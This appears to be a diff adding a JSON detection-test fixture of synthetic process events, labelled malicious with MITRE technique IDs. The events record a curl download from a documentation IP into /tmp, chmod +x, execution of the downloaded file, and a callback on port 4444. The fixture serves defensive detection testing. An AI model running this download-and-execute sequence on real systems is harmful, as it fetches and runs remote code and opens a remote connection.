@@ -1,0 +1,13 @@
+{
+  "name": "curl_lolbin_exec_from_tmp",
+  "ground_truth": { "malicious": true, "techniques": ["T1105", "T1222.002", "T1204.002"] },
+  "events": [
+    {"id":"a1","host_id":"h1","boot_id":"b","ts_unix_ns":1700000000000000000,"kind":"exec","pid":100,"start_ticks":100,"ppid":10,"parent_start_ticks":10,"exe":"/bin/bash"},
+    {"id":"a2","host_id":"h1","boot_id":"b","ts_unix_ns":1700000001000000000,"kind":"exec","pid":101,"start_ticks":101,"ppid":100,"parent_start_ticks":100,"exe":"/usr/bin/curl","args":"http://203.0.113.5/x -o /tmp/payload"},
+    {"id":"a3","host_id":"h1","boot_id":"b","ts_unix_ns":1700000002000000000,"kind":"net.connect","pid":101,"start_ticks":101,"exe":"/usr/bin/curl","raddr":"203.0.113.5","rport":80},
+    {"id":"a4","host_id":"h1","boot_id":"b","ts_unix_ns":1700000003000000000,"kind":"file.write","pid":101,"start_ticks":101,"exe":"/usr/bin/curl","path":"/tmp/payload"},
+    {"id":"a5","host_id":"h1","boot_id":"b","ts_unix_ns":1700000004000000000,"kind":"exec","pid":102,"start_ticks":102,"ppid":100,"parent_start_ticks":100,"exe":"/usr/bin/chmod","args":"+x /tmp/payload"},
+    {"id":"a6","host_id":"h1","boot_id":"b","ts_unix_ns":1700000005000000000,"kind":"exec","pid":103,"start_ticks":103,"ppid":100,"parent_start_ticks":100,"exe":"/tmp/payload"},
+    {"id":"a7","host_id":"h1","boot_id":"b","ts_unix_ns":1700000006000000000,"kind":"net.connect","pid":103,"start_ticks":103,"exe":"/tmp/payload","raddr":"203.0.113.5","rport":4444}
+  ]
+}
